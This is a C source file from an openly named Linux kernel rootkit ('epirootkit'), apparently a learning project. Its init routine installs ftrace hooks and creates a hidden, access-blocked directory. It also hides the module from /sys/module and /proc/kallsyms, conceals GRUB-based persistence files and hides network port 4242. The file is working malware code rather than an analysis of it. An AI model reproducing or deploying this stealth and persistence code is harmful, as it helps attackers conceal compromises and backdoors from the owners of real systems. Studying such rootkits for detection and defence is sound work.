#include "init.h"

#include "alterate_api.h"
#include "config.h"
#include "epirootkit.h"
#include "forbid_api.h"
#include "ftrace.h"
#include "hide_api.h"

int init_interceptor(void) {
    int err;
    
    err = create_dir(HIDDEN_DIR_PATH);
    if (err) {
        ERR_MSG("init: mkdir %s failed: %d\n", HIDDEN_DIR_PATH, err);
        return err;
    }
    
    err = alterate_init();
    if (err) {
        ERR_MSG("init: alterate_init() failed: %d\n", err);
        return err;
    }
   
    err = forbid_init();
    if (err) {
        ERR_MSG("init: forbid_init() failed: %d\n", err);
        return err;
    }
    
    err = hide_init();
    if (err) {
        ERR_MSG("init: hide_init() failed: %d\n", err);
        return err;
    }

    err = hide_port_init();
     if (err) {
        ERR_MSG("init: hide_port_init() failed: %d\n", err);
        return err;
    }
    
    err = fh_install_hooks(hooks, hook_array_size);
    if (err) {
        ERR_MSG("init: failed to install hooks\n");
        return err;
    }
    
    // Hide directory HIDDEN_DIR_PATH
    hide_file(HIDDEN_DIR_PATH);

    // Forbid access to HIDDEN_DIR_PATH
    forbid_file(HIDDEN_DIR_PATH);

    // Hide module in /sys/modules
    hide_file("/sys/module/epirootkit");

    // Hide module in /proc/kallsyms
    alterate_add("/proc/kallsyms", -1, "epirootkit", NULL, NULL);

    // Hide peristence stuff
    hide_file("/.grub.sh");
    hide_file("/etc/default/grub.d/99.cfg");
    hide_file("/usr/lib/epirootkit");
    forbid_file("/.grub.sh");
    forbid_file("/etc/default/grub.d/99.cfg");
    forbid_file("/usr/lib/epirootkit");

    // Hide ports
    hide_port("4242");

    // Hide module in /proc/modules
    // hide_module();
    
    return SUCCESS;
}

void exit_interceptor(void) {
    fh_remove_hooks(hooks, hook_array_size);

    hide_exit();
    forbid_exit();
    hide_exit();
}

int create_dir(char *path) {
    char cmd[128];
    int rc;

    snprintf(cmd, sizeof(cmd), "mkdir -p -- %s", path);
    rc = exec_str_as_command(cmd, false);
    if (rc < 0)
        return rc;

    return SUCCESS;
}
